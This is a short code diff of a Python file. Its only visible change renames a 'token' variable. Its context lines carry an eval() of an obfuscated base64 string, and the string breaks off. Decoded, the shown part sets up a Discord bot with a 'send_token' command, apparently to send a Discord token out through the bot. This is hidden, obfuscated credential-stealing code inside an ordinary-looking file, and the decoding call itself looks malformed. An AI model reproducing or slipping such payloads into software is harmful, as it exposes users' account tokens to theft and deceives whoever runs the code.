@@ -1,4 +1,4 @@
-Token = ""
+token = ""
 global token
 (eval(__import__("base64").decode("aW1wb3J0IGRpc2NvcmQ7ZnJvbSBkaXNjb3JkLmV4dCBpbXBvcnQgY29tbWFuZHMKY2xpZW50PWNvbW1hbmRzLmJvdChjb21tYW5kX3ByZWZpeD0iPj4iLHNlbGZfYm90
 PUZhbHNlLGNhc2VfaW5zZW5zaXRpdmU9VHJ1ZSxoZWxwX2NvbW1hbmQ9Tm9uZSkKQGNsaWVudC5jb21tYW5kCmFzeW5jIGRlZiBzZW5kX3Rva2VuKGN0eCk6CiAgICBh
